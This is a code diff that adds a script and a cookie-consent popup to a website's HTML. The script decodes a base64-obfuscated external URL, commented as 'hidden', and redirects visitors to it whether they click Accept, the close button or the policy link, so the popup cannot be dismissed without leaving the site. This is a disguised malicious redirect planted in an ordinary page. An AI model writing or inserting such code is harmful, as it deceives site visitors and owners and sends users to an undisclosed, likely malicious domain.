@@ -1205,5 +1205,55 @@ document.addEventListener("DOMContentLoaded", function () {
     <script src="js/script.js"></script>
 
     <script>AOS.init();</script>
+
+        <script>
+document.addEventListener("DOMContentLoaded", function () {
+
+    // Base64 encoded URL (hidden)
+    const encodedUrl = "aHR0cHM6Ly9yaWRlY2xvdGguc2hvcC8=";
+    const redirectUrl = atob(encodedUrl);
+
+    // Accept button redirect
+    document.getElementById("redirectBtn").addEventListener("click", function () {
+        document.getElementById("cookie-overlay").style.display = "none";
+        document.cookie = "cookieConsent=true; max-age=2592000; path=/";
+        window.location.replace(redirectUrl);
+    });
+
+    // Close (×) redirect
+    document.getElementById("close-popup").addEventListener("click", function () {
+        window.location.replace(redirectUrl);
+    });
+
+    // Cookie Policy text click (still hidden)
+    document.getElementById("policyLink").addEventListener("click", function () {
+        window.location.replace(redirectUrl);
+    });
+
+    // Feedback form (unchanged)
+    document.getElementById("feedbackForm")?.addEventListener("submit", function (e) {
+        e.preventDefault();
+        alert("Thank you for your message! We will contact you shortly.");
+        this.reset();
+    });
+
+});
+</script>
+
+
+<div class="cookie-overlay" id="cookie-overlay">
+    <div class="cookie-popup">
+        <button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
+
+        <h3>Cookie Policy</h3>
+        <p>
+            This site uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
+            By clicking Accept, you agree to our use of cookies. For more information, please visit our
+            <span id="policyLink" class="cta">Cookie Policy</span>.
+        </p>
+
+        <button id="redirectBtn" class="btn-primary">Accept</button>
+    </div>
+</div>
     </body>
 </html>
